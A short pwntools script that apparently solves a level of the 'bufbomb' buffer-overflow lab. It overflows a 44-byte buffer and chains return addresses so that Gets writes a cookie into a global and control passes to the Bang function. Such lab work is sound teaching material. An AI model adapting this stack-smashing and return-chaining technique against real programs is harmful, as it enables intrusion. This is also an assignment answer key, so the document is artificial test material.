from pwn import *

elf = ELF("./bufbomb")

p = elf.process(['-u20521859'])
raw_input("DEBUG")

payload = b"A"*44
#call Gets(global_value)
payload += p32(0x80044498) # Gets address
payload += p32(0x800442a9) # Bang address (return of Gets => call Bang)
payload += p32(0x80049160) #global_value address

p.sendline(payload)

payload2 = p32(0x2b23d2da) #cookie, payload2 sendafter the Gets(global_value) is called

p.sendline(payload2)

p.interactive()
